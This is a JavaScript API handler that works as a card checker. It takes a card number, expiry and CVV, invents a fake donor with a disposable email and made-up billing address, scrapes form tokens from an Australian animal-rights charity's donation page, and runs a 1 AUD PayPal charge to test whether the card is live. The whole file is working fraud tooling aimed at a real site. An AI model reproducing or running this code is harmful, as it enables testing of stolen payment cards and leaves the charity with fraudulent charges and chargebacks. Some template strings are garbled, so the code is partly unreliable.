const cookieJar = new Map();

// Helper for random strings
const randomString = (length) =>
    Array(length)
        .fill(0)
        .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
        .join('');

// Public Email API (Mail.gw fallback)
async function getPublicEmail() {
    try {
        const domainRes = await fetch('https://api.mail.gw/domains');
        const domainData = await domainRes.json();
        const domain = domainData['hydra:member']?.[0]?.domain;
        if (domain) return `\( {randomString(10)}@ \){domain}`;
    } catch {}
    return `${randomString(10)}@outlook.com`;
}

async function request(url, options = {}) {
    const headers = new Headers(options.headers || {});

    const cookieString = Array.from(cookieJar)
        .map(([key, value]) => `\( {key}= \){value}`)
        .join('; ');

    if (cookieString) headers.set('cookie', cookieString);
    if (!headers.has('user-agent')) {
        headers.set(
            'user-agent',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
        );
    }

    const response = await fetch(url, { ...options, headers });

    // Handle Set-Cookie
    const setCookies = response.headers.getSetCookie?.() || [];
    for (const cookie of setCookies) {
        const [pair] = cookie.split(';');
        const [name, value] = pair.split('=').map(s => s.trim());
        if (name && value) cookieJar.set(name, value);
    }

    return response;
}

export default async function handler(req, res) {
    cookieJar.clear(); // Fresh session per request

    const { data: inputData } = req.query;
    if (!inputData) {
        return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
    }

    const [number, month, yearShort, cvv] = inputData.split('|');
    if (!number || !month || !yearShort || !cvv) {
        return res.status(400).json({ error: 'Invalid card format' });
    }

    const email = await getPublicEmail();
    const user = {
        firstName: randomString(6),
        lastName: randomString(6),
        email,
    };

    try {
        // 1. Get main donation page → find form view URL
        const html = await (await request('https://animalrights.org.au/donate-now/')).text();
        const formUrlMatch = html.match(/data-form-view-url=['"]([^'"]+)['"]/);
        if (!formUrlMatch) throw new Error("Could not find data-form-view-url");

        const formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
        const formText = await (await request(formUrl)).text();

        // Extract window.givewpDonationFormExports = {...};
        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
        if (!exportedMatch) throw new Error("Could not find givewpDonationFormExports");

        const data = JSON.parse(exportedMatch[1]);
        const gateway = data.registeredGateways?.find(g => g.id === 'paypal-commerce');
        if (!gateway) throw new Error("paypal-commerce gateway not found in registeredGateways");

        const settings = gateway.settings;
        const clientId = settings?.sdkOptions?.clientId;
        if (!clientId) throw new Error("No PayPal clientId found in settings");

        // 2. Get PayPal access token
        const auth = Buffer.from(`${clientId}:`).toString('base64');
        const tokenRes = await request('https://api.paypal.com/v1/oauth2/token', {
            method: 'POST',
            headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'grant_type=client_credentials',
        });

        if (!tokenRes.ok) {
            throw new Error(`PayPal auth failed: ${await tokenRes.text()}`);
        }

        const { access_token: accessToken } = await tokenRes.json();
        if (!accessToken) throw new Error("No access_token received");

        // 3. Create PayPal order via GiveWP AJAX
        const params = new URLSearchParams(new URL(data.donateUrl).search);
        const tokens = {
            formId: settings.donationFormId?.toString(),
            formHash: settings.donationFormNonce,
            signature: params.get('givewp-route-signature'),
            signatureId: params.get('givewp-route-signature-id'),
            signatureExp: params.get('givewp-route-signature-expiration'),
        };

        if (!tokens.formId || !tokens.formHash) {
            throw new Error("Missing formId or formHash");
        }

        const orderFormData = new FormData();
        orderFormData.append('action', 'give_paypal_commerce_create_order');
        orderFormData.append('give-form-id', tokens.formId);
        orderFormData.append('give-form-hash', tokens.formHash);
        orderFormData.append('give_payment_mode', 'paypal-commerce');
        orderFormData.append('give-amount', '1');
        orderFormData.append('give_first', user.firstName);
        orderFormData.append('give_last', user.lastName);
        orderFormData.append('give_email', user.email);
        orderFormData.append('give-cs-form-currency', 'AUD');
        orderFormData.append('give-gateway', 'paypal-commerce'); // sometimes needed

        const orderRes = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: orderFormData,
        });

        if (!orderRes.ok) {
            const errText = await orderRes.text();
            throw new Error(`GiveWP AJAX failed (${orderRes.status}): ${errText.slice(0, 300)}`);
        }

        let orderJson;
        try {
            orderJson = await orderRes.json();
        } catch (e) {
            const text = await orderRes.text();
            throw new Error(`GiveWP response not JSON: ${text.slice(0, 200)}`);
        }

        // ─── Extract order ID ──────────────────────────────────────────────
        let orderId = null;

        // Standard GiveWP + PayPal Commerce success path
        if (orderJson?.success && orderJson?.data?.id) {
            orderId = orderJson.data.id;
        }
        // Flat id
        else if (orderJson?.id) {
            orderId = orderJson.id;
        }
        // Other common variants
        else if (orderJson?.data?.order?.id) {
            orderId = orderJson.data.order.id;
        } else if (orderJson?.orderID) {
            orderId = orderJson.orderID;
        } else if (orderJson?.data?.orderID) {
            orderId = orderJson.data.orderID;
        } else if (orderJson?.paypal_order_id) {
            orderId = orderJson.paypal_order_id;
        }

        // Log the full response for debugging (appears in function logs)
        console.log('GiveWP create-order full response:', JSON.stringify(orderJson, null, 2));

        if (!orderId) {
            throw new Error(
                `No PayPal order ID found in GiveWP response. ` +
                `Available keys: ${Object.keys(orderJson).join(', ')}. ` +
                `Check function logs for complete JSON.`
            );
        }

        // 4. Supply card details — try PATCH first (preferred), fallback to confirm-payment-source
        const expiry = `\( {month.padStart(2, '0')}/20 \){yearShort.padStart(2, '0')}`;

        let confirmRes;
        let confirmData;

        // Attempt PATCH /orders/{id} (more modern)
        confirmRes = await request(
            `https://api.paypal.com/v2/checkout/orders/${orderId}`,
            {
                method: 'PATCH',
                headers: {
                    'Authorization': `Bearer ${accessToken}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify([{
                    op: 'replace',
                    path: '/payment_source',
                    value: {
                        card: {
                            number,
                            security_code: cvv,
                            expiry,
                            name: `${user.firstName} ${user.lastName}`,
                            billing_address: {
                                address_line_1: '123 Sample Street',
                                admin_area_2: 'Indore',
                                admin_area_1: 'MP',
                                postal_code: '452001',
                                country_code: 'IN',
                            },
                        },
                    },
                }]),
            }
        );

        if (confirmRes.ok) {
            // If PATCH worked → capture
            const captureRes = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({}),
                }
            );
            confirmData = await captureRes.json();
        } else {
            // Fallback: old confirm-payment-source
            confirmRes = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
                {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        payment_source: {
                            card: {
                                number,
                                security_code: cvv,
                                expiry,
                                name: `${user.firstName} ${user.lastName}`,
                            },
                        },
                    }),
                }
            );
            confirmData = await confirmRes.json();
        }

        // 5. Return result
        const isSuccess = confirmData?.status === 'COMPLETED' || confirmData?.status === 'APPROVED';
        res.status(isSuccess ? 200 : 402).json({
            success: isSuccess,
            paypal_status: confirmData?.status || confirmData?.name || 'unknown',
            paypal_response: confirmData,
            orderId,
            message: confirmData?.message || confirmData?.details?.[0]?.description || 'See paypal_response',
        });

    } catch (error) {
        console.error('Handler error:', error);
        res.status(500).json({
            error: error.message,
            stack: error.stack?.split('\n').slice(0, 4),
        });
    }
                }
